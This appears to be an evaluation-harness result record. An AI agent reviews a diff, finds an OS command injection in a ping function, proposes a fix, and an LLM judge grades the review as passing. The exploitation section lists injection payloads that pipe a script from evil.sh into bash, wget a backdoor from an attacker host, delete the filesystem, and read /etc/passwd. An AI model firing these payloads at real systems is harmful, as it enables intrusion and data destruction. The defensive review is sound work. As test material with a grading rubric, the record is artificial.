@@ -1,0 +1,71 @@
+{
+  "caseId": "cmdi-shell-true",
+  "rep": 0,
+  "prompt": "Review this diff for security issues and report your findings.",
+  "files": [
+    "diff-cmdi.patch"
+  ],
+  "output": "## Security Audit Findings — `diff-cmdi.patch`\n\n### 🔴 CRITICAL: OS Command Injection (CWE-78)\n\n**File:** `src/net/ping.py`, line 9\n**Function:** `ping_host()`\n\n**The change introduces a critical command injection vulnerability.**\n\n```python\n# BEFORE (safe)\nresult = subprocess.run([\"ping\", \"-c\", \"1\", host], capture_output=True, text=True)\n\n# AFTER (vulnerable)\nresult = subprocess.run(\"ping -c 1 \" + host, shell=True, capture_output=True, text=True)\n```\n\n**What changed and why it's dangerous:**\n1. The argument-list form was replaced with a **string concatenated with untrusted input** (`host` comes directly from `request.GET.get(\"host\")`).\n2. `shell=True` was added, so the string is passed to `/bin/sh -c`, allowing shell metacharacters to be interpreted.\n\n**Exploitation:** An attacker fully controls `host` with no validation. Any of these payloads execute arbitrary commands:\n- `?host=127.0.0.1;cat /etc/passwd`\n- `?host=$(curl http://evil.sh|bash)`\n- `` ?host=`rm -rf /` ``\n- `?host=localhost && wget http://attacker/backdoor -O /tmp/x`\n\n**Impact:** Remote Code Execution as the web-app user — full server compromise, data exfiltration, lateral movement, and pivoting. This is a pre-auth RCE if the view is unauthenticated.\n\n**Risk rating:** Critical (CVSS ~9.8, `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`).\n\n---\n\n### Remediation\n\n**Required fix — revert to the argument-list form (no shell):**\n```python\nresult = subprocess.run(\n    [\"ping\", \"-c\", \"1\", host],\n    capture_output=True, text=True, timeout=5\n)\n```\n\n**Defense in depth (recommended in addition):**\n- **Validate `host`** before use — reject anything that isn't a valid hostname/IP:\n  ```python\n  import ipaddress, re\n  def _valid_host(h):\n      try:\n          ipaddress.ip_address(h); return True\n      except ValueError:\n          return bool(re.fullmatch(r\"[A-Za-z0-9.-]{1,253}\", h))\n  ```\n  Return `HttpResponseBadRequest` on failure.\n- **Never use `shell=True`** with any untrusted input.\n- Add a `timeout=` to prevent resource-exhaustion / hang DoS.\n- Consider not exposing raw command output (`result.stdout`) to callers to avoid info leakage; return a normalized reachable/unreachable status.\n\n---\n\n### Compliance / Standards Mapping\n| Framework | Reference |\n|-----------|-----------|\n| OWASP Top 10 2021 | A03 Injection |\n| CWE | CWE-78 (OS Command Injection), CWE-88 (Argument Injection) |\n| PCI DSS 4.0 | Req. 6.2.4 (injection defenses in code) |\n| OWASP ASVS | V5.3.8 (OS command injection protection) |\n\n### Verdict\n**🚫 Block this diff — do not merge.** It reintroduces a critical, directly exploitable RCE by regressing a previously safe pattern. The safe (pre-change) implementation should be retained, hardened with input validation and a timeout.\n\n**Summary:** 1 file reviewed, 1 finding — 1 Critical (0 High / 0 Medium / 0 Low).",
+  "exitCode": 0,
+  "timedOut": false,
+  "infraRetries": 0,
+  "startedAt": "2026-07-18T22:36:12.375Z",
+  "durationMs": 27437,
+  "checks": [
+    {
+      "matcher": "llm_rubric",
+      "passed": true,
+      "details": {
+        "verdict": "pass",
+        "judgments": [
+          {
+            "verdict": "pass",
+            "reasoning": "The agent's review correctly and unambiguously identifies the OS command injection vulnerability (CWE-78), noting that the user-controlled `host` parameter from `request.GET` is passed to `subprocess.run` via string concatenation with `shell=True`, and provides exploitation examples and correct remediation (reverting to argument-list form without shell).",
+            "raw": "VERDICT: PASS\nREASON: The agent's review correctly and unambiguously identifies the OS command injection vulnerability (CWE-78), noting that the user-controlled `host` parameter from `request.GET` is passed to `subprocess.run` via string concatenation with `shell=True`, and provides exploitation examples and correct remediation (reverting to argument-list form without shell)."
+          },
+          {
+            "verdict": "pass",
+            "reasoning": "The agent correctly identified the OS command injection vulnerability (CWE-78), explaining that the diff replaced the safe argument-list subprocess.run call with a string-concatenated command using shell=True and unsanitized user input from request.GET, and provided accurate exploitation examples and remediation.",
+            "raw": "VERDICT: PASS\nREASON: The agent correctly identified the OS command injection vulnerability (CWE-78), explaining that the diff replaced the safe argument-list subprocess.run call with a string-concatenated command using shell=True and unsanitized user input from request.GET, and provided accurate exploitation examples and remediation."
+          }
+        ],
+        "model": "claude-sonnet-5",
+        "transport": "claude-agent",
+        "prompt": "You are an impartial evaluator inside an automated agent-testing tool. Judge ONLY whether the agent's output satisfies the rubric — not style, not effort, not whether you would have answered differently.\n\n<rubric>\nThe review must correctly identify an OS command injection vulnerability in the diff: the user-controlled 'host' value from request.GET is passed to subprocess.run with shell=True via string concatenation, allowing shell command injection. PASS only if command injection (or an equivalent unambiguous description) is identified as a genuine security vulnerability; FAIL if it misses it or makes only stylistic comments.\n</rubric>\n\n<task_given_to_agent>\nReview this diff for security issues and report your findings.\n</task_given_to_agent>\n\n<agent_output>\n## Security Audit Findings — `diff-cmdi.patch`\n\n### 🔴 CRITICAL: OS Command Injection (CWE-78)\n\n**File:** `src/net/ping.py`, line 9\n**Function:** `ping_host()`\n\n**The change introduces a critical command injection vulnerability.**\n\n```python\n# BEFORE (safe)\nresult = subprocess.run([\"ping\", \"-c\", \"1\", host], capture_output=True, text=True)\n\n# AFTER (vulnerable)\nresult = subprocess.run(\"ping -c 1 \" + host, shell=True, capture_output=True, text=True)\n```\n\n**What changed and why it's dangerous:**\n1. The argument-list form was replaced with a **string concatenated with untrusted input** (`host` comes directly from `request.GET.get(\"host\")`).\n2. `shell=True` was added, so the string is passed to `/bin/sh -c`, allowing shell metacharacters to be interpreted.\n\n**Exploitation:** An attacker fully controls `host` with no validation. Any of these payloads execute arbitrary commands:\n- `?host=127.0.0.1;cat /etc/passwd`\n- `?host=$(curl http://evil.sh|bash)`\n- `` ?host=`rm -rf /` ``\n- `?host=localhost && wget http://attacker/backdoor -O /tmp/x`\n\n**Impact:** Remote Code Execution as the web-app user — full server compromise, data exfiltration, lateral movement, and pivoting. This is a pre-auth RCE if the view is unauthenticated.\n\n**Risk rating:** Critical (CVSS ~9.8, `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`).\n\n---\n\n### Remediation\n\n**Required fix — revert to the argument-list form (no shell):**\n```python\nresult = subprocess.run(\n    [\"ping\", \"-c\", \"1\", host],\n    capture_output=True, text=True, timeout=5\n)\n```\n\n**Defense in depth (recommended in addition):**\n- **Validate `host`** before use — reject anything that isn't a valid hostname/IP:\n  ```python\n  import ipaddress, re\n  def _valid_host(h):\n      try:\n          ipaddress.ip_address(h); return True\n      except ValueError:\n          return bool(re.fullmatch(r\"[A-Za-z0-9.-]{1,253}\", h))\n  ```\n  Return `HttpResponseBadRequest` on failure.\n- **Never use `shell=True`** with any untrusted input.\n- Add a `timeout=` to prevent resource-exhaustion / hang DoS.\n- Consider not exposing raw command output (`result.stdout`) to callers to avoid info leakage; return a normalized reachable/unreachable status.\n\n---\n\n### Compliance / Standards Mapping\n| Framework | Reference |\n|-----------|-----------|\n| OWASP Top 10 2021 | A03 Injection |\n| CWE | CWE-78 (OS Command Injection), CWE-88 (Argument Injection) |\n| PCI DSS 4.0 | Req. 6.2.4 (injection defenses in code) |\n| OWASP ASVS | V5.3.8 (OS command injection protection) |\n\n### Verdict\n**🚫 Block this diff — do not merge.** It reintroduces a critical, directly exploitable RCE by regressing a previously safe pattern. The safe (pre-change) implementation should be retained, hardened with input validation and a timeout.\n\n**Summary:** 1 file reviewed, 1 finding — 1 Critical (0 High / 0 Medium / 0 Low).\n</agent_output>\n\nAnswer in EXACTLY this format (first line must be the verdict):\nVERDICT: PASS\nREASON: <one short paragraph>\n\nor\n\nVERDICT: FAIL\nREASON: <one short paragraph>"
+      }
+    }
+  ],
+  "usage": {
+    "input_tokens": 4,
+    "output_tokens": 1304,
+    "model": "inherit"
+  },
+  "transcript": {
+    "subtype": "success",
+    "num_turns": 2,
+    "total_cost_usd": 0.043212999999999994,
+    "modelUsage": {
+      "claude-haiku-4-5-20251001": {
+        "inputTokens": 541,
+        "outputTokens": 13,
+        "cacheReadInputTokens": 0,
+        "cacheCreationInputTokens": 0,
+        "webSearchRequests": 0,
+        "costUSD": 0.000606,
+        "contextWindow": 200000,
+        "maxOutputTokens": 32000
+      },
+      "claude-opus-4-8[1m]": {
+        "inputTokens": 4,
+        "outputTokens": 1304,
+        "cacheReadInputTokens": 9734,
+        "cacheCreationInputTokens": 512,
+        "webSearchRequests": 0,
+        "costUSD": 0.04260699999999999,
+        "contextWindow": 1000000,
+        "maxOutputTokens": 64000
+      }
+    },
+    "_note": "SDK message stream removed for privacy; summary retained"
+  }
+}
